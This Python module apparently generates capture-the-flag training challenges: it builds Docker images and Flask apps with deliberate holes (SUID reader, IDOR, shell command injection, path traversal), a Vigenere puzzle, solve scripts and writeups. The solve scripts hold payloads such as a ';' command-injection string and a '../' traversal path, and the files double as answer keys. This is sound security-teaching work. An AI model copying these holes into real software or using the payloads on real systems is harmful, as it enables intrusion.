def web_df(extra=""):
    return ("FROM python:3.12-slim\n"
            "RUN pip install --no-cache-dir flask==3.0.3\n"
            "WORKDIR /app\nCOPY app.py /app/app.py\n"
            + extra +
            "EXPOSE 5000\nCMD [\"python\",\"/app/app.py\"]\n")

def vigenere(text, key):
    out=[]; i=0
    for c in text:
        if c.isalpha():
            k=ord(key[i%len(key)])-97; b=ord('A') if c.isupper() else ord('a')
            out.append(chr((ord(c)-b+k)%26+b)); i+=1
        else:
            out.append(c)
    return "".join(out)

def build(template, spec, flag):
    if template == "linux_suid":
        user=spec.get("user","player"); pw=spec.get("password","player"); b=spec.get("bin","readflag")
        files={
 "Dockerfile": (
   "FROM debian:12-slim\n"
   "RUN apt-get update && apt-get install -y --no-install-recommends openssh-server gcc libc6-dev procps && rm -rf /var/lib/apt/lists/*\n"
   "RUN mkdir -p /run/sshd\n"
   "RUN useradd -m -s /bin/bash %s && echo '%s:%s' | chpasswd\n"
   "RUN echo '%s' > /root/flag.txt && chmod 600 /root/flag.txt\n"
   "COPY suid.c /tmp/suid.c\n"
   "RUN gcc -o /usr/local/bin/%s /tmp/suid.c && chown root:root /usr/local/bin/%s && chmod 4755 /usr/local/bin/%s\n"
   "COPY entrypoint.sh /entrypoint.sh\n"
   "RUN chmod +x /entrypoint.sh && sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config\n"
   "EXPOSE 2222\n"
   "ENTRYPOINT [\"/entrypoint.sh\"]\n") % (user,pw,pw,flag,b,b,b),
 "suid.c": '#include <fcntl.h>\n#include <unistd.h>\nint main(void){int fd=open("/root/flag.txt",O_RDONLY);if(fd<0)return 1;char b[512];ssize_t n;while((n=read(fd,b,sizeof b))>0)write(1,b,n);return 0;}\n',
 "entrypoint.sh": "#!/bin/bash\nssh-keygen -A\nexec /usr/sbin/sshd -D -e -p 2222\n",
        }
        solve = ("#!/usr/bin/env bash\n"
                 "sshpass -p \"%s\" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                 "-p \"${PORT}\" %s@127.0.0.1 \"/usr/local/bin/%s\" | grep -o 'RP{[^}]*}'\n") % (pw,user,b)
        meta={"kind":"service","internal_port":2222,"user":user,"password":pw,"bin":b}
        neg_help={"user":user}
        return files, solve, meta, neg_help

    if template == "web_idor":
        app=('from flask import Flask\n'
             'app = Flask(__name__)\n'
             'NOTES = {0: "Admin: registro interno. Flag: %s", 1: "Nota publica de bienvenida"}\n'
             '@app.route("/")\n'
             'def index():\n'
             '    return "<h1>Directorio de usuarios</h1><p>Consulta /user/1</p>"\n'
             '@app.route("/user/<int:uid>")\n'
             'def user(uid):\n'
             '    return "<pre>" + NOTES.get(uid, "No existe") + "</pre>"\n'
             'app.run(host="0.0.0.0", port=5000)\n') % flag
        solve=('#!/usr/bin/env bash\n'
               'curl -s "http://127.0.0.1:${PORT}/user/0" | grep -o \'RP{[^}]*}\'\n')
        return {"Dockerfile": web_df(), "app.py": app}, solve, {"kind":"service","internal_port":5000}, {}

    if template == "web_cmdi":
        app=('from flask import Flask, request\n'
             'import subprocess\n'
             'app = Flask(__name__)\n'
             '@app.route("/")\n'
             'def lookup():\n'
             '    host = request.args.get("host", "127.0.0.1")\n'
             '    r = subprocess.run("getent hosts " + host, shell=True, capture_output=True, text=True)\n'
             '    return "<h1>Resolucion DNS</h1><pre>" + r.stdout + r.stderr + "</pre>"\n'
             'app.run(host="0.0.0.0", port=5000)\n')
        solve=('#!/usr/bin/env bash\n'
               'curl -s -G --data-urlencode "host=127.0.0.1; cat /flag.txt" "http://127.0.0.1:${PORT}/" | grep -o \'RP{[^}]*}\'\n')
        return {"Dockerfile": web_df("RUN echo '%s' > /flag.txt\n" % flag), "app.py": app}, solve, {"kind":"service","internal_port":5000}, {}

    if template == "web_lfi":
        app=('from flask import Flask, request\n'
             'app = Flask(__name__)\n'
             '@app.route("/")\n'
             'def view():\n'
             '    page = request.args.get("page", "home")\n'
             '    try:\n'
             '        content = open("/var/www/pages/" + page).read()\n'
             '    except Exception as e:\n'
             '        content = "Error: " + str(e)\n'
             '    return "<h1>Galeria</h1><pre>" + content + "</pre>"\n'
             'app.run(host="0.0.0.0", port=5000)\n')
        df=web_df("RUN mkdir -p /var/www/pages && echo '<p>inicio</p>' > /var/www/pages/home\nRUN echo '%s' > /flag.txt\n" % flag)
        solve=('#!/usr/bin/env bash\n'
               'curl -s "http://127.0.0.1:${PORT}/?page=../../../flag.txt" | grep -o \'RP{[^}]*}\'\n')
        return {"Dockerfile": df, "app.py": app}, solve, {"kind":"service","internal_port":5000}, {}

    if template == "crypto_vigenere":
        key=spec.get("key","rootpath")
        enc=vigenere(flag, key)
        files={"mensaje.txt": "Mensaje cifrado con Vigenere (clave = nombre de la plataforma en minusculas).\n"+enc+"\n"}
        solve=("#!/usr/bin/env bash\n"
               "python3 - \"${FILE}\" <<'EOP'\n"
               "import sys\n"
               "key=\"%s\"\n"
               "s=open(sys.argv[1]).read().splitlines()[1]\n"
               "out=[];i=0\n"
               "for c in s:\n"
               "    if c.isalpha():\n"
               "        k=ord(key[i%%len(key)])-97; b=ord('A') if c.isupper() else ord('a')\n"
               "        out.append(chr((ord(c)-b-k)%%26+b)); i+=1\n"
               "    else:\n"
               "        out.append(c)\n"
               "print(''.join(out))\n"
               "EOP\n") % key
        return files, solve, {"kind":"static","file":"mensaje.txt"}, {"key":key}

    raise ValueError("plantilla desconocida: " + template)

def challenge_yml(spec, slug, flag):
    lines = [
      "id: " + slug,
      "title: \"%s\"" % spec["title"],
      "category: %s" % spec["category"],
      "difficulty: %d" % spec.get("difficulty", 2),
      "points: %d" % spec["value"],
      "certs:",
      "  - { name: %s, domain: \"%s\" }" % (spec.get("cert",""), spec.get("domain","")),
      "type: %s" % ("container" if spec["template"].startswith(("web_","linux_")) else "static"),
      "template: %s" % spec["template"],
      "flag: { type: static, format: \"RP{...}\" }",
      "hints:",
      "  - { level: 1, cost: 5,  text: \"%s\" }" % spec.get("hint1","Observa el comportamiento de la aplicacion."),
      "  - { level: 2, cost: 15, text: \"%s\" }" % spec.get("hint2","Prueba la tecnica clasica de la categoria."),
      "  - { level: 3, cost: 30, text: \"%s\" }" % spec.get("hint3","Consulta la solucion de referencia."),
      "status: draft",
    ]
    return "\n".join(lines) + "\n"

def writeup(spec, flag):
    return ("# Writeup - %s\n\n"
            "- Categoria: %s\n- Plantilla: %s\n- Certificacion: %s / %s\n\n"
            "## Contexto\n%s\n\n## Explotacion\nEjecutar `solve.sh` reproduce la via de explotacion.\n\n"
            "## Flag\n    %s\n\n## Lecciones\n%s\n") % (
            spec["title"], spec["category"], spec["template"], spec.get("cert",""), spec.get("domain",""),
            spec.get("description","Reto generado por el pipeline RootPath."), flag,
            spec.get("lesson","Repasar la tecnica asociada al dominio."))
